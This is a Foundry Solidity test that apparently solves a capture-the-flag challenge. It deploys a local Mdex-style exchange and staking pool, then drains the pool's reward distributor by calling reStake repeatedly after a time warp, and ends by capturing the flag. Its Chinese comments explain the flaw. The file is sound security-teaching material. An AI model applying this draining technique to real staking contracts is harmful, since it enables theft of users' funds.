// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./interface.sol";

contract attackTest is Test {
    string constant MdexFactory_Artifact = 'out/factory.sol/MdexFactory.json';
    string constant WHT_Artifact = 'out/WHT.sol/WHT.json';
    string constant MdexRouter_Artifact = 'out/router.sol/MdexRouter.json';
    string constant deploy_Artifact = 'out/deploy.sol/deploy.json';

    IMdexFactory public mdexFactory;
    IWHT public wht;
    IMdexRouter public router;
    IDeploy public deploy;
    IMdexPair public pair; 
    IQuintConventionalPool public pool;

    address public attacker = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;

    event flag(string result,address challenger);
    
    function setUp() public{
        // 1.部署factory合约，调用getInitCodeHash函数获取hash在setInitCodeHash中进行初始化
        mdexFactory = IMdexFactory(deployHelper_mdexFactory(MdexFactory_Artifact));
        mdexFactory.setInitCodeHash(mdexFactory.getInitCodeHash());
        console.log("1.factory contract initializes successfully!");
        // 2.部署router合约，填入factory地址和WHT地址（WHT地址可以为任意不产生影响）
        wht = IWHT(deployHelper_wht(WHT_Artifact));
        router = IMdexRouter(deployHelper_mdexRouter(MdexRouter_Artifact,address(mdexFactory),address(wht)));
        console.log("2.router contract:", address(router));
        // 3.部署deploy合约，填入factory和router合约地址，之后调用step1和step2函数进行初始化
        deploy = IDeploy(deployHelper_deploy(deploy_Artifact,address(mdexFactory),address(router)));
        console.log("3.deploy contract:", address(deploy));
        deploy.Step1();
        deploy.step2();
        // 4.调用airdrop函数领取初始代币
        vm.startPrank(attacker);
        deploy.airdrop();
        vm.stopPrank();
        console.log("4.attacker gets airdrop:", deploy.balanceOf(attacker));
        console.log("complete initialization, please start your attack.");
        console.log();

        // 其他初始化工作
        pair = IMdexPair(deploy.pair());
        pool = IQuintConventionalPool(deploy.quintADDRESS());
    }

    function test_isComplete() public{
        vm.startPrank(attacker);
       
        console.log("prepare for attack");
        console.log();
        pair.approve(address(pool), type(uint256).max);
        deploy.approve(address(pool), type(uint256).max);
        // stake增加质押LP的数量
        pool.stake(99999999999999999999000, 1);
        // 等一段时间，这样我们可以得到一些利润, 因为5小时之内的利率比较高，领取到的利润也就高，
        // 因此选择在4小时，累计一段时间，然后利率又高，因此可以得到的钱也更多
        uint256 newtime = block.timestamp + 3600 * 4;
        vm.warp(newtime);
        console.log("4 hours later");
        console.log();

        // 利用restake的漏洞
        for (uint256 i = 0;; i++) {
            // 直到 distributor 不够钱了，就无法转出去，然后报错，我们捕获然后停止
            console.log("[for loop] deploy's balance:",deploy.balanceOf(address(deploy)));
            try pool.reStake(1) {
            } catch (bytes memory err) {
                break;
            }
        }
        console.log();

        vm.expectEmit(true, true, true, true);
        emit flag("succese", attacker);
        pool.captureFlag();
        
        console.log("deploy's balance:",deploy.balanceOf(address(deploy)));
        console.log("captureFlag!");

        vm.stopPrank();
    }

    // 因为foundry在一个测试文件中存在编译器版本问题，所以采取这种方式进行部署合约
    function deployHelper_mdexFactory(string memory what) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        // 构造器有参数
        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(address(this)));
        assembly {
            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))
        }
    }
    function deployHelper_wht(string memory what) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        assembly {
            addr := create(0, add(bytecode, 0x20), mload(bytecode))
        }
    }
    function deployHelper_mdexRouter(string memory what,address _addr1, address _addr2) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        // 构造器有参数
        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(_addr1,_addr2));
        assembly {
            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))
        }
    }
    function deployHelper_deploy(string memory what,address _addr1, address _addr2) public returns (address addr) {
        bytes memory bytecode = vm.getCode(what);
        // 构造器有参数
        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode,abi.encode(_addr1,_addr2));
        assembly {
            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))
        }
    }
}
